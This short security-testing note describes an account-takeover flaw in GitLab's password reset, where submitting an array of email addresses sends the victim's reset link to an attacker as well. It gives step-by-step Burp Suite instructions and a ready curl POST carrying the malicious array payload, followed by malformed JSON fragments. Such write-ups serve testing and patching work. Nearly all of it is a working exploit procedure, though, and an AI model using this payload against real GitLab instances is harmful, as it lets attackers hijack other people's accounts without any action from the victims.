## Use case

The GitLab password reset flow was vulnerable due to improper handling of the email parameter, allowing an attacker to take over an account by submitting an array of email addresses instead of a single string. This vulnerability was critical as it required no interaction from the victim.

## Steps to test

1. Go to the 'Forgot your password?' link on GitLab.
2. Enter the victim's email and intercept the submit request in Burp Suite.
3. Use the Content-Type Converter extension to convert the request body to JSON.
4. Replace the single user[email] string with an array containing both the victim's email and the attacker's email.
5. Forward the modified request.
6. Both addresses will receive an email containing the same password reset link.
7. Click the link, set a new password, and log in as the victim.

## Commands

```text
curl -X POST https://gitlab.example.com/users/password -H 'Content-Type: application/json' -d '{"user":{"email":["victim@gmail.com","attacker@gmail.com"]}}'
"user[email]":"victim@gmail.com"
"user" {
"email" [
"victim@gmail.com",
"attacker@gmail.com"
]
},
```
